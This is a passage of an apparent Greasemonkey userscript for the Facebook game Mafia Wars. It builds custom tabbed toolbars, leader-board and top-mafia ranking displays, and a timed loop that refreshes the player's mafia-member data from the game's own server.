        }
        GM_log('Toolbar created');
                        
        oDom.parentNode.insertBefore(oTemp1, oDom.nextSibling);

        //remove all the members showing
        oSnapshot = g_Utils.getSnapshot(strMyMafiaMembers);
        for (var i = 0; i < oSnapshot.snapshotLength; i++)
        oSnapshot.snapshotItem(i).parentNode.removeChild(oSnapshot.snapshotItem(i));

        oSnapshot = g_Utils.getSnapshot(strMyMafiaInsert);
        oDom = oSnapshot.snapshotItem(0);

        //create tables for entry
        oDiv = document.createElement('div');
        oDiv.id = strAlphaTables;
        oDiv.setAttribute('style','float:left;');
        
        oDom.parentNode.insertBefore(oDiv, oDom.nextSibling);
        oDom.parentNode.setAttribute('style','float:left; min-height: 450px;');


        oTbody = document.createElement('table');
        oTbody.innerHTML = "<tr>Setup Complete</tr>";
        oTbody.firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 732px; float: left;');

        oDiv.appendChild(oTbody);

        g_Utils.doLog('CreateAlphaDisplay', bDebugOn, 'Tables have been setup');
        oDiv.replaceChild(aAlphaDisplayTable[0][1],oTbody);

        g_Utils.doLog('CreateAlphaDisplay', bDebugOn, 'Display created');

    }
    
    // creates a toolbar
    function createToolBar(_oDiv, _inumButtons, _sname, _slabels, _type) {
        // create tabe header and append to _obj
        
        
        var oTabs;
        oTabs = document.createElement('ul');
        oTabs.setAttribute('class', 'tabs');
        oTabs.id = _sname;

        GM_log('Created TBAR = '+oTabs.id);
                
        _oDiv.appendChild(oTabs);

        //create the buttons
        var oTabItem, oDiv, oDOM;
        var aButtonName = new Array();

        //extra the button names
        aButtonName = _slabels.split(' ');

        for (var i = 0; i < _inumButtons; i++) {
            if (i == 0) {
                //create the first button
                oTabItem = g_DOMUtils.newElem('li', '', 'tab_on tab_first');
                if (_type == 'LV') 
                  oTabItem.setAttribute('style', 'width: 45px;border:0 none;')
                else 
                  oTabItem.setAttribute('style', 'width: 35px')
                oTabs.appendChild(oTabItem);

                oDiv = g_DOMUtils.newElem('div', '', 'tab_content');
                oDiv.setAttribute('style', 'text-align: left');
                oTabItem.appendChild(oDiv);

                oButton = g_DOMUtils.newElem('a', aButtonName[i]);
                g_DOMUtils.doAppend(oButton, g_DOMUtils.newText(aButtonName[i]));
                oButton.addEventListener("click", g_ListenerLib.click_ABCButtons(i), false);
                oDiv.appendChild(oButton);
            
            if (_type == 'LV') {
              oDOM = oTabItem;
                  oTabItem = g_DOMUtils.newElem('li', '', 'spacer_right_on');
                  oTabItem.innerHTML = '<img src="http://mwfb.static.zynga.com/mwfb/graphics/spacer.gif"/>';
                  oTabItem.setAttribute('style',"width: 6px; height: 39px; background:url('http://mwfb.static.zynga.com/mwfb/graphics/map_based_jobs/expert_view/expertview_nav_right_ro.gif') no-repeat scroll 0 0 transparent");
                  oDOM.parentNode.insertBefore(oTabItem, oDOM.nextSibling);
                  
                  oDOM = oTabItem;
                  oTabItem = g_DOMUtils.newElem('li', '', 'spacer_left_off');
                  oTabItem.innerHTML = '<img src="http://mwfb.static.zynga.com/mwfb/graphics/spacer.gif"/>';
                  oTabItem.setAttribute('style',"width: 6px; height: 39px; background:url('http://mwfb.static.zynga.com/mwfb/graphics/map_based_jobs/expert_view/expertview_nav_left.gif') no-repeat scroll 0 0 transparent");
                oDOM.parentNode.insertBefore(oTabItem, oDOM.nextSibling);
            } else {
                  oDOM = oTabItem;
                  oTabItem = g_DOMUtils.newElem('li', '', 'red_black_cap');
                  oTabItem.innerHTML = '<img src="http://mwfb.static.zynga.com/mwfb/graphics/spacer.gif"/>';
                  oDOM.parentNode.insertBefore(oTabItem, oDOM.nextSibling);
              }
            } else if ((i + 1) == _inumButtons) {
                // create the end button
                oDOM = oTabItem;
                oTabItem = g_DOMUtils.newElem('li', '', 'tab_off tab_last');
                if (_type == 'LV') 
                  oTabItem.setAttribute('style', 'width: 45px;border:0 none;')
                else 
                  oTabItem.setAttribute('style', 'width: 35px')
                oDOM.parentNode.insertBefore(oTabItem, oDOM.nextSibling);

                oDiv = g_DOMUtils.newElem('div', '', 'tab_content');
                oDiv.setAttribute('style', 'text-align: left');
                oTabItem.appendChild(oDiv);

                oButton = g_DOMUtils.newElem('a', aButtonName[i]);
                g_DOMUtils.doAppend(oButton, g_DOMUtils.newText(aButtonName[i]));
                oButton.addEventListener("click", g_ListenerLib.click_ABCButtons(i), false);
                oDiv.appendChild(oButton);
                
                if (_type == 'LV') {
              oDOM = oTabItem;
                  oTabItem = g_DOMUtils.newElem('li', '', 'spacer_right_on');
                  oTabItem.innerHTML = '<img src="http://mwfb.static.zynga.com/mwfb/graphics/spacer.gif"/>';
                  oTabItem.setAttribute('style',"width: 6px; height: 39px; background:url('http://mwfb.static.zynga.com/mwfb/graphics/map_based_jobs/expert_view/expertview_nav_right.gif') no-repeat scroll 0 0 transparent");
                  oDOM.parentNode.insertBefore(oTabItem, oDOM.nextSibling);
                  
            }
            } else {
                // create the middle buttons
                oDOM = oTabItem;
                oTabItem = g_DOMUtils.newElem('li', '', 'tab_off');
                if (_type == 'LV') 
                  oTabItem.setAttribute('style', 'width: 45px;border:0 none;')
                else 
                  oTabItem.setAttribute('style', 'width: 35px')
                oDOM.parentNode.insertBefore(oTabItem, oDOM.nextSibling);

                oDiv = g_DOMUtils.newElem('div', '', 'tab_content');
                oDiv.setAttribute('style', 'text-align: left');
                oTabItem.appendChild(oDiv);

                oButton = g_DOMUtils.newElem('a', aButtonName[i]);
                g_DOMUtils.doAppend(oButton, g_DOMUtils.newText(aButtonName[i]));
                oButton.addEventListener("click", g_ListenerLib.click_ABCButtons(i), false);
                oDiv.appendChild(oButton);

                if (_type == 'LV') {
              oDOM = oTabItem;
                  oTabItem = g_DOMUtils.newElem('li', '', 'spacer_right_off');
                  oTabItem.innerHTML = '<img src="http://mwfb.static.zynga.com/mwfb/graphics/spacer.gif"/>';
                  oTabItem.setAttribute('style',"width: 6px; height: 39px; background:url('http://mwfb.static.zynga.com/mwfb/graphics/map_based_jobs/expert_view/expertview_nav_right.gif') no-repeat scroll 0 0 transparent");
                  oDOM.parentNode.insertBefore(oTabItem, oDOM.nextSibling);
                  
                  oDOM = oTabItem;
                  oTabItem = g_DOMUtils.newElem('li', '', 'spacer_left_off');
                  oTabItem.innerHTML = '<img src="http://mwfb.static.zynga.com/mwfb/graphics/spacer.gif"/>';
                  oTabItem.setAttribute('style',"width: 6px; height: 39px; background:url('http://mwfb.static.zynga.com/mwfb/graphics/map_based_jobs/expert_view/expertview_nav_left.gif') no-repeat scroll 0 0 transparent");
                  oDOM.parentNode.insertBefore(oTabItem, oDOM.nextSibling);
                  
            } else {
              oDOM = oTabItem;
                  oTabItem = g_DOMUtils.newElem('li', '', 'black_black_cap');
                  oTabItem.innerHTML = '<img src="http://mwfb.static.zynga.com/mwfb/graphics/spacer.gif"/>';
                  oDOM.parentNode.insertBefore(oTabItem, oDOM.nextSibling);
                }
            }
        }
    }
}


function CreateLeaderDisplay() {
  
    var oDom, oDiv, oSnapShot, oButton, oUL, oTabItem, oTemp, oImg;;
    var i, strClass;

    oDom = document.getElementById(strTopFamilyToolbar);
    if (oDom!=null) {

      // Set Menu bar selection
  
      if ((strCityCode == 'mw_city5')||(strCityCode == 'mw_city6')||(strCityCode == 'mw_city7')) {
        for (i=0; i<oDom.childNodes.length; i++) {
            if ((i%3)==0) {
                if (oDom.childNodes[i].textContent == 'Leader Board' ) {
                    strClass = 'tab_on'
                } else {
                    strClass = 'tab_off';
                  };
                if (i==0) {
                    strClass += ' tab_first'
                } else if (i== (oDom.childNodes.length-1)) {
                    strClass += ' tab_last';
                  };
            } else if ((i%3)==1) {
              if (oDom.childNodes[i-1].textContent == 'Leader Board' ) {
                strClass = 'spacer_right_on'
              } else {
                strClass = 'spacer_right_off';
              }
            } else {
              if (oDom.childNodes[i+1].textContent == 'Leader Board' ) {
                strClass = 'spacer_left_on'
              } else {
                strClass = 'spacer_left_off';
              }
            }
            oDom.childNodes[i].setAttribute('class',strClass);
        }
      } else {
        for (i=0; i<oDom.childNodes.length; i++) {
            if (g_Utils.isEven(i)) {
                if (oDom.childNodes[i].textContent == 'Leader Board' )
                    strClass = 'tab_on'
                else
                    strClass = 'tab_off';
                if (i==0)
                    strClass += ' tab_first'
                else if (i== (oDom.childNodes.length-1))
                    strClass += ' tab_last';
            } else {
                if (oDom.childNodes[i-1].textContent == 'Leader Board' )
                    strClass = 'red_black_cap'
                else if (i != (oDom.childNodes.length -1)) {
                    if (oDom.childNodes[i+1].textContent == 'Leader Board')
                        strClass = 'black_red_cap'
                    else
                        strClass = 'black_black_cap';
                };
            };
            oDom.childNodes[i].setAttribute('class',strClass);
        }
      }

        // Remove the garbage on this screen
        if ((strCityCode == 'mw_city5')|| (strCityCode == 'mw_city6')||(strCityCode == 'mw_city7')){
          oDom = oDom.parentNode.parentNode;
          oDiv = oDom.nextSibling;
        } else {
          oDom = oDom.parentNode;
          oDiv = oDom.nextSibling;
      }

        while (oDiv != null) {
            oDiv.parentNode.removeChild(oDiv);
            oDiv = oDom.nextSibling;
        }

        //Add title
        oDiv   = document.createElement('div');
        oDiv.setAttribute('class','title');
        oDiv.textContent = 'Leader Board'
        oDom.parentNode.appendChild(oDiv);
        oDom = oDiv;
        
        //Add Status Line
        oDiv   = CreateStatusLine(0)
        oDom.parentNode.appendChild(oDiv);
        oDom = oDiv;

        // add the tool bar
        oTemp = document.createElement('div');
        oTemp.id = strLeaderBoardToolbar;
        oTemp.setAttribute('style','float: left; height: 60px; width: 735px;');

        oDiv = document.createElement('div');
        oDiv.setAttribute('style','padding: 10px 0px 0px; float: left; width: 245px; text-align: center; font-weight: bold;');
        oImg = document.createElement('img')
        oImg.setAttribute('src',imgArrow[aTopMafiaSortDirection[0]]);
        oDiv.appendChild(oImg);
        oButton = document.createElement('a');
        oButton.id = 'Most Experienced';
        oButton.textContent = 'Most Experienced';
        oButton.addEventListener("click", g_ListenerLib.click_LeaderBoardButtons(0), false);
        oDiv.appendChild(oButton);
        oTemp.appendChild(oDiv);

        oDiv = document.createElement('div');
        oDiv.setAttribute('style','padding: 10px 0px 0px; float: left; width: 100px; text-align: center; font-weight: bold;');
        oImg = document.createElement('img')
        oDiv.appendChild(oImg);
        oButton = document.createElement('a');
        oButton.id = 'Fights Won';
        oButton.innerHTML = 'Fights<br/>Won';
        oButton.addEventListener("click", g_ListenerLib.click_LeaderBoardButtons(1), false);
        oDiv.appendChild(oButton);
        oTemp.appendChild(oDiv);

        oDiv = document.createElement('div');
        oDiv.setAttribute('style','padding: 10px 0px 0px; float: left; width: 100px; text-align: center; font-weight: bold;');
        oImg = document.createElement('img')
        oDiv.appendChild(oImg);
        oButton = document.createElement('a');
        oButton.id = 'Successful Heists';
        oButton.innerHTML = 'Successful<br/>Heists';
        oButton.addEventListener("click", g_ListenerLib.click_LeaderBoardButtons(2), false);
        oDiv.appendChild(oButton);
        oTemp.appendChild(oDiv);

        oDiv = document.createElement('div');
        oDiv.setAttribute('style','padding: 10px 0px 0px; float: left; width: 100px; text-align: center; font-weight: bold;');
        oImg = document.createElement('img')
        oDiv.appendChild(oImg);
        oButton = document.createElement('a');
        oButton.id = 'Jobs Completed';
        oButton.innerHTML = 'Jobs<br/>Completed';
        oButton.addEventListener("click", g_ListenerLib.click_LeaderBoardButtons(3), false);
        oDiv.appendChild(oButton);
        oTemp.appendChild(oDiv);
        
        oDom.parentNode.appendChild(oTemp);
        oDom = oTemp;

        //create tables for entry
        oDiv = document.createElement('div');
        oDiv.id = strLeaderBoardTables;
        oDiv.setAttribute('style','float:left;');

        oDom.parentNode.insertBefore(oDiv, oDom.nextSibling);

        oTbody = document.createElement('table');
        oTbody.innerHTML = "<tr>Setup Complete</tr>";
        oTbody.firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 732px; float: left;');

        oDiv.appendChild(oTbody);

        g_Utils.doLog('CreateLeaderDisplay', bDebugOn, 'Tables have been setup');
        oDiv.replaceChild(aTopMafiaDisplayTable[0][aTopMafiaSortDirection[0]],oTbody);

        g_Utils.doLog('CreateLeaderDisplay', bDebugOn, 'Display created');
    }

}

function GetTopMafiaHeader(){
    // Get the Top Mafia Header from the Mafia Members Page

    var i, strUrl;
    var xmlhttp = new XMLHttpRequest();
    var myHTML, oSnapshot, strLookup, strTemp, strValue, newHTML;
    var tempDiv;

    var iWatchDog;

    // look for local_xw_sig
    local_xw_sig = unsafeWindow.local_xw_sig;

    // build search string;
    strUrl  = 'http://facebook.mafiawars.com/mwfb/remote/html_server.php?xw_controller=group&xw_action=view&xw_city=1&xw_client_id=8&ajax=1&liteload=1';
    strUrl += '&sf_xw_sig=' + local_xw_sig;
    strUrl += '&sf_xw_user_id=' + FB_user_id;

    // start the WatchDog Timer to catch hung requests.  15 seconds maximum.
    iWatchDog = setTimeout(function (e) {
        xmlhttp.abort();
        GM_log('killed the web request');
    }, 15000);

    // Search for item
    xmlhttp.open('POST',                            strUrl, false);
    xmlhttp.setRequestHeader('Host',                'facebook.mafiawars.com');
    xmlhttp.setRequestHeader('User-agent',          navigator.userAgent);
    xmlhttp.setRequestHeader('Content-Type',        'application/x-www-form-urlencoded; charset=UTF-8');
    xmlhttp.setRequestHeader('Accept',              '*/*');
    xmlhttp.setRequestHeader('Accept-Language',     'en-us,en;q=0.5');
    xmlhttp.setRequestHeader('Accept-Encoding',     'gzip,deflate');
    xmlhttp.setRequestHeader('Accept-Charset',      'ISO-8859-1,utf-8;q=0.7,*;q=0.7');
    xmlhttp.setRequestHeader('X-Requested-With',    'XMLHttpRequest');

    xmlhttp.send(null);

    //cancel the WatchDog timer
    clearTimeout(iWatchDog);

        if ( xmlhttp.status == 200) {

        // process results
        myHTML = xmlhttp.responseText;
           
        // remove the script code for response
        newHTML = myHTML.replace(/<script(.|\s)*?\/script>/g, '');
   
        //Stuff it into the DIV to get the DOM structure
        tempDiv = document.createElement('div');
        tempDiv.innerHTML = newHTML;

        //find the item
        oSnapshot = document.evaluate( strTopMafiaBox, tempDiv, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
        GM_log('oSnapshot.snapshotLength = '+oSnapshot.snapshotLength);

        if (oSnapshot.snapshotLength > 0) {
            return oSnapshot.snapshotItem(0);
        } else {
            return null
        }
    } else {
        return null;
    }

}

function CreateTopMafiaDisplay() {
    var oDom, oDiv, oSnapShot, oButton, oUL, oTabItem, oTemp;
    var i, strClass;

    oDom = document.getElementById(strTopFamilyToolbar);
    if (oDom!=null) {

		// Set Menu bar selection
		if ((strCityCode == 'mw_city5')||(strCityCode == 'mw_city6')||(strCityCode == 'mw_city7')) {
			for (i=0; i<oDom.childNodes.length; i++) {
				if ((i%3)==0) {
					if (oDom.childNodes[i].textContent == 'Top Mafia' ) {
						strClass = 'tab_on'
					} else {
						strClass = 'tab_off';
					}
					if (i==0) {
						strClass += ' tab_first'
					} else if (i== (oDom.childNodes.length-1)) {
						strClass += ' tab_last';
					}
				} else if ((i%3)==1) {
				if (oDom.childNodes[i-1].textContent == 'Top Mafia' ) {
						strClass = 'spacer_right_on'
					} else {
						strClass = 'spacer_right_off';
					}
				} else {
					if (oDom.childNodes[i+1].textContent == 'Top Mafia' ) {
						strClass = 'spacer_left_on'
					} else {
						strClass = 'spacer_left_off';
					}
				}
				oDom.childNodes[i].setAttribute('class',strClass);
			}
		} else {  
			for (i=0; i<oDom.childNodes.length; i++) {
				if (g_Utils.isEven(i)) {
					if (oDom.childNodes[i].textContent == 'Top Mafia' )
					strClass = 'tab_on'
					else
					strClass = 'tab_off';
					if (i==0)
					strClass += ' tab_first'
					else if (i== (oDom.childNodes.length-1))
					strClass += ' tab_last';
				} else {
					if (oDom.childNodes[i-1].textContent == 'Top Mafia' )
						strClass = 'red_black_cap'
					else if (i != (oDom.childNodes.length -1)) {
						if (oDom.childNodes[i+1].textContent == 'Top Mafia')
							strClass = 'black_red_cap'
						else
							strClass = 'black_black_cap';
					};
				};
				oDom.childNodes[i].setAttribute('class',strClass);
			}
		}
	        
		// Remove the garbage on this screen
		if ((strCityCode == 'mw_city5')||(strCityCode == 'mw_city6')||(strCityCode == 'mw_city7')) {
			oDom = oDom.parentNode.parentNode;
			oDiv = oDom.nextSibling;
		} else {
			oDom = oDom.parentNode;
			oDiv = oDom.nextSibling;
		}
	      
		while (oDiv != null) {
		    oDiv.parentNode.removeChild(oDiv);
		    oDiv = oDom.nextSibling;
		}

        //Add title
        oDiv   = document.createElement('div');
        oDiv.setAttribute('class','title');
        oDiv.textContent = 'Top Mafia Rankings'
        oDom.parentNode.appendChild(oDiv);
        oDom = oDiv;
        
        //Add TopMafia Box if it can be found
        oDiv   = document.createElement('div');
        oDiv   = GetTopMafiaHeader();
        if (oDiv != null) {
            oDom.parentNode.appendChild(oDiv);
            oDom = oDiv;
        }
        
        //Add Status Line
        oDiv   = CreateStatusLine(0)
        oDom.parentNode.appendChild(oDiv);
        oDom = oDiv;

        //Add toolbar
        oUL   = document.createElement('ul');
        oUL.id = strTopMafiaToolbar;
        oUL.setAttribute('class','minitabs');

        //mastermind button
        oTabItem = g_DOMUtils.newElem('li', '', 'tab_on tab_middle')
        oUL.appendChild(oTabItem);

        oDiv = g_DOMUtils.newElem('div', '', 'minitab_content');
        oDiv.setAttribute('style','width:115px');
        oTabItem.appendChild(oDiv);

        oButton = g_DOMUtils.newElem('a', 'MasterMind');
        g_DOMUtils.doAppend(oButton, g_DOMUtils.newText('MasterMind'));
        oButton.addEventListener("click", g_ListenerLib.click_TopMafiaButtons(0), false);
        oDiv.appendChild(oButton);

        //wheelman button
        oTabItem = g_DOMUtils.newElem('li', '', 'tab_off tab_middle')
        oUL.appendChild(oTabItem);

        oDiv = g_DOMUtils.newElem('div', '', 'minitab_content');
        oDiv.setAttribute('style','width:115px');
        oTabItem.appendChild(oDiv);

        oButton = g_DOMUtils.newElem('a', 'Wheelman');
        g_DOMUtils.doAppend(oButton, g_DOMUtils.newText('Wheelman'));
        oButton.addEventListener("click", g_ListenerLib.click_TopMafiaButtons(1), false);
        oDiv.appendChild(oButton);

        //Button Man button
        oTabItem = g_DOMUtils.newElem('li', '', 'tab_off tab_middle')
        oUL.appendChild(oTabItem);

        oDiv = g_DOMUtils.newElem('div', '', 'minitab_content');
        oDiv.setAttribute('style','width:115px');
        oTabItem.appendChild(oDiv);

        oButton = g_DOMUtils.newElem('a', 'Button Man');
        g_DOMUtils.doAppend(oButton, g_DOMUtils.newText('Button Man'));
        oButton.addEventListener("click", g_ListenerLib.click_TopMafiaButtons(2), false);
        oDiv.appendChild(oButton);

        //Bodyguard button
        oTabItem = g_DOMUtils.newElem('li', '', 'tab_off tab_middle')
        oUL.appendChild(oTabItem);

        oDiv = g_DOMUtils.newElem('div', '', 'minitab_content');
        oDiv.setAttribute('style','width:115px');
        oTabItem.appendChild(oDiv);

        oButton = g_DOMUtils.newElem('a', 'Bodyguard');
        g_DOMUtils.doAppend(oButton, g_DOMUtils.newText('Bodyguard'));
        oButton.addEventListener("click", g_ListenerLib.click_TopMafiaButtons(3), false);
        oDiv.appendChild(oButton);

        //Safecracker button
        oTabItem = g_DOMUtils.newElem('li', '', 'tab_off tab_middle')
        oUL.appendChild(oTabItem);

        oDiv = g_DOMUtils.newElem('div', '', 'minitab_content');
        oDiv.setAttribute('style','width:115px');
        oTabItem.appendChild(oDiv);

        oButton = g_DOMUtils.newElem('a', 'Safecracker');
        g_DOMUtils.doAppend(oButton, g_DOMUtils.newText('Safecracker'));
        oButton.addEventListener("click", g_ListenerLib.click_TopMafiaButtons(4), false);
        oDiv.appendChild(oButton);

        //Bagman button
        oTabItem = g_DOMUtils.newElem('li', '', 'tab_off tab_middle')
        oUL.appendChild(oTabItem);

        oDiv = g_DOMUtils.newElem('div', '', 'minitab_content');
        oDiv.setAttribute('style','width:115px');
        oTabItem.appendChild(oDiv);

        oButton = g_DOMUtils.newElem('a', 'Bagman');
        g_DOMUtils.doAppend(oButton, g_DOMUtils.newText('Bagman'));
        oButton.addEventListener("click", g_ListenerLib.click_TopMafiaButtons(5), false);
        oDiv.appendChild(oButton);

        oDom.parentNode.appendChild(oUL);
        oDom = oUL;

        // Add header
        oDiv = document.createElement('div');
        oDiv.setAttribute('style','margin-top: 15px; float: left; height: 60px; width: 720px;');

        oTemp = document.createElement('div');
        oTemp.setAttribute('style','padding: 10px 0px 0px; float: left; width: 190px; text-align: left; font-weight: bold;');
        oTemp.innerHTML = 'Name & Level';
        oDiv.appendChild(oTemp);

        oTemp = document.createElement('div');
        oTemp.setAttribute('style','padding: 10px 0px 0px; float: left; width: 55px; text-align: center; font-weight: bold;');
        oTemp.innerHTML = 'Character';
        oDiv.appendChild(oTemp);

        oTemp = document.createElement('div');
        oTemp.setAttribute('style','padding: 10px 0px 0px; float: left; width: 100px; text-align: center; font-weight: bold;');
        oTemp.innerHTML = 'Fights<br> Won';
        oDiv.appendChild(oTemp);

        oTemp = document.createElement('div');
        oTemp.setAttribute('style','padding: 10px 0px 0px; float: left; width: 100px; text-align: center; font-weight: bold;');
        oTemp.innerHTML = 'Successful Heists';
        oDiv.appendChild(oTemp);

        oTemp = document.createElement('div');
        oTemp.setAttribute('style','padding: 10px 0px 0px; float: left; width: 100px; text-align: center; font-weight: bold;');
        oTemp.innerHTML = 'Jobs Completed';
        oDiv.appendChild(oTemp);

        oTemp = document.createElement('div');
        oTemp.setAttribute('style','padding: 10px 0px 0px; float: left; width: 137px; text-align: center; font-weight: bold;');
        oTemp.innerHTML = 'Actions';
        oDiv.appendChild(oTemp);

        oDom.parentNode.appendChild(oDiv);
        oDom = oDiv;

        //create tables for entry
        oDiv = document.createElement('div');
        oDiv.id = strTopMafiaTables;
        oDiv.setAttribute('style','float:left;');

        oTbody = document.createElement('table');
        oTbody.innerHTML = "<tr>Setup Complete</tr>";
        oTbody.firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 732px; float: left;');

        oDiv.appendChild(oTbody);

        oDom.parentNode.appendChild(oDiv);

        g_Utils.doLog('CreateTopMafiaDisplay', bDebugOn, 'Tables have been setup');
        oDiv.replaceChild(aTopBonusDisplayTable[0],oTbody);

        g_Utils.doLog('CreateTopMafiaDisplay', bDebugOn, 'Display created');
    }

}


function MainLoop(){

    var bAutoDisable,
        iMafiaSize, ioldTimer,
        oDom, oSnapshot ;

    var iCurrentTime = g_Utils.getCurrentTime();

    if (strFrameId == 'MafiaWars') {

        bAutoDisable = GM_getValue('bAutoDisable', false);
        bReLoad = GM_getValue('ForceReload',false);

        // See if we should be updating the mafia data
        if (!bDataBeingUpdated && (!bAutoDisable || bReLoad )) {

            iCurrentTime = g_Utils.getCurrentTime();
            iDataTimeStamp = GM_getValue(FB_user_id+'-iDataTimeStamp');

            if (((iCurrentTime - iDataTimeStamp ) > 60) || bReLoad)  {

                //cancel any existing processing event
                clearTimeout(iProcessEvent)

                //start new data download
                g_Utils.doLog('Main', bDebugOn, 'Updating Mafia Tables - 1 hours has elapsed since last update');
                bDataBeingUpdated = true;
                bSaveData= true;
                iAlphaSortBy = GM_getValue('iAlphaSortBy');
                iProcessEvent = setTimeout(
                    function (e) {
                        iCount = 0;
                        iErrorCount = 0;
                        iPageCount = 1;
                        getMafiaMembers();
                    },
                    g_Utils.getRandRange(500, 750));
            }
        }

        if (!bDataBeingUpdated && (iAlphaSortBy != GM_getValue('iAlphaSortBy'))) {
            bDataBeingUpdated = true;
            iAlphaSortBy = GM_getValue('iAlphaSortBy');
            DisplaySettings();

            //cancel any existing processing event
            clearTimeout(iProcessEvent);

            //start a new event
            bSaveData= false;
            iProcessEvent = setTimeout(function (e) {
                ProcessData(4);
            },
            750)
        }


        if (bAutoDisable != GM_getValue('bAutoDisable')) {
            bAutoDisable = GM_getValue('bAutoDisable');
            DisplaySettings()
        }


        // Fix Mafia Members Menu
        
        if (g_Utils.getSnapshot(strFreeGifts).snapshotLength) {
            // We are on the Mafia Team Page
            // and have not been here before
            if (document.getElementById(strTopFamilyToolbar)==null) {
              
              setTimeout(
                  function (e) {
                      FixMafiaMenu()
                  },
                  10);
            }
        }
        

        // Test to see if we are at the Mafia Members page

        if (g_Utils.getSnapshot(strMyMafia).snapshotLength) {
            // We are on the Mafia Team Page
            CreateAlphaDisplay();
            DisplaySettings();

        }

        if (g_Utils.getSnapshot(strLeaderBoard).snapshotLength) {
            // We are on the Top Mafia Page
            CreateLeaderDisplay();
            DisplaySettings();
        }

        DisplayStatus();

    }

    if ((strFrameId == 'Main')&&(!bTopFrame)) {
        g_Utils.doLog('Event', bDebugOn,  strFrameId + ' has fired. change_count= ' + change_count);
    }
}

function notifyChange() {
    if (notify_count == change_count) MainLoop();
    if (notify_count != change_count) {
        schedNotify();
        return;
    }
    //placed in the MainLoop
    scheduled = false;
}

function schedNotify() {
    scheduled = true;
    notify_count = change_count;
    iOnloadEvent = setTimeout(function (e) {
        notifyChange();
    },
    250);
}

/*****  begin   *****/

var gvar = {};

strFrameId = 'Ignore'
if (self.location.href.indexOf('http://apps.facebook.com/inthemafia/') != -1) {
	strFrameId = 'FaceBook'
} else if (self.location.href.indexOf('http://facebook.mafiawars.com/mwfb/remote/html_server.php?xw_controller=index') != -1) {
	strFrameId = 'MafiaWars'
}

// check if we are the top URL
try {
	// this will cause an error
	if (window.top == self) {
		bTopFrame = true
	} else {
		bTopFrame = false
	}
} catch (_errObj) { 
	bTopFrame = false
}

if (strFrameId != 'Ignore') {
    // Initialize any data, menu commands, windows
    Initialize()


    // Listen for Changes to the screen
    try {
        document.addEventListener("DOMNodeInserted", function (e) {
            change_count++;
            if (!scheduled && change_count > 2 ) schedNotify();
        },
        false);
    } catch(_errObj) {
        g_Utils.doLogError('Load event', 'Unkown error occurred when trying to insert the schedule event function', _errObj);
    }


    // Listen for Changes to the screen
    window.addEventListener("unload", function (e) {
        try {
            g_Utils.doLog('Event', bDebugOn, 'Unloading Script - Killing Events - ' + strFrameId );
            clearTimeout(iProcessEvent);
            clearTimeout(iSaveTableEvent);
            clearTimeout(iLoadEvent);

        } catch(_errObj) {
            g_Utils.doLogError('Unload event', 'Unable to close some events', _errObj);
        }
    },
    false);

    g_Utils.doLog('Event', bDebugOn, 'Script Loaded - ' + strFrameId );

} else {
    GM_log('Script ignoring unknown iframe: '+self.name);
}


/*****  Listner *****/

function ListenerLib() {
    //make this function public
    this.click_ABCButtons           = click_ABCButtons;
    this.click_LeaderBoardDisplay   = click_LeaderBoardDisplay;
    this.click_LeaderBoardButtons   = click_LeaderBoardButtons;
    this.click_TopMafiaDisplay      = click_TopMafiaDisplay;
    this.click_TopMafiaButtons      = click_TopMafiaButtons;
    this.click_Auto                 = click_Auto;
    this.click_Sort                 = click_Sort;
    this.click_ReLoad               = click_ReLoad;
    this.menu_Debug                 = menu_Debug;
    this.menu_AutoLoad              = menu_AutoLoad;


    function click_ABCButtons(iButton) {
        return function () {
            var iBC, oButtons, oButton, iButtons, oDom;
            var strClass, strStyle;

            // Change the Toolbar 1
            oDom = document.getElementById(strAlphaToolbar+'1');
			for (i=0; i<oDom.childNodes.length; i++) {
				if ((i%2)==0) {
			    	if ((i/2)==iButton  )
			        	strClass = 'tab_on'
			        else
			            strClass = 'tab_off';
			        if (i==0)
			            strClass += ' tab_first'
			        else if (i== (oDom.childNodes.length-1))
			            strClass += ' tab_last';
			    } else {
			        if (((i-1)/2)==iButton  )
			        	 strClass = 'red_black_cap'
			        else if (i != (oDom.childNodes.length -1)) {
			        	if (((i+1)/2)==iButton)
			            	strClass = 'black_red_cap'
			           	else
			                strClass = 'black_black_cap';
			        };
			    };
			    oDom.childNodes[i].setAttribute('class',strClass);
			}
        
            // Change the Toolbar 2
            oDom = document.getElementById(strAlphaToolbar+'2');
			for (i=0; i<oDom.childNodes.length; i++) {
				if ((i%3)==0) {
					if ((i/3)==iButton ) {
						strClass = 'tab_on'
					} else {
						strClass = 'tab_off';
					};
					if (i==0) {
						strClass += ' tab_first'
					} else if (i== (oDom.childNodes.length-1)) {
						strClass += ' tab_last';
					};
					strStyle = 'width: 45px; border: 0pt none;';
				} else if ((i%3)==1) {
					if (((i-1)/3)==iButton ) {
						  strClass = 'spacer_right_on'
						  strStyle = 'width: 6px; height: 39px; background: url("http://mwfb.static.zynga.com/mwfb/graphics/map_based_jobs/expert_view/expertview_nav_right_ro.gif") no-repeat scroll 0pt 0pt transparent;';
					} else {
						  strClass = 'spacer_right_off';
					  	strStyle = 'width: 6px; height: 39px; background: url("http://mwfb.static.zynga.com/mwfb/graphics/map_based_jobs/expert_view/expertview_nav_right.gif") no-repeat scroll 0pt 0pt transparent;';
					}
				} else {
					if (((i+1)/3)==iButton ) {
						strClass = 'spacer_left_on'
						strStyle = 'width: 6px; height: 39px; background: url("http://mwfb.static.zynga.com/mwfb/graphics/map_based_jobs/expert_view/expertview_nav_left_ro.gif") no-repeat scroll 0pt 0pt transparent;';
					} else {
						strClass = 'spacer_left_off';
						strStyle = 'width: 6px; height: 39px; background: url("http://mwfb.static.zynga.com/mwfb/graphics/map_based_jobs/expert_view/expertview_nav_left.gif") no-repeat scroll 0pt 0pt transparent;';
					}
				}
				oDom.childNodes[i].setAttribute('class',strClass);
				oDom.childNodes[i].setAttribute('style',strStyle);
				
			}

            //Activate the appropriate body
            oDom = document.getElementById(strAlphaTables);

            oDom.replaceChild(aAlphaDisplayTable[iButton][1],oDom.firstChild);

        }
    }
    
    function click_LeaderBoardDisplay() {
        CreateLeaderDisplay();
        DisplaySettings();

    }

    function click_LeaderBoardButtons(iButton) {
        return function () {
            var iBC, oButtons, oButton, iButtons, ODOM;
            var test;

            // Change the Toolbar
            oDOM = document.getElementById(strLeaderBoardToolbar);
            oButtons = oDOM.childNodes;
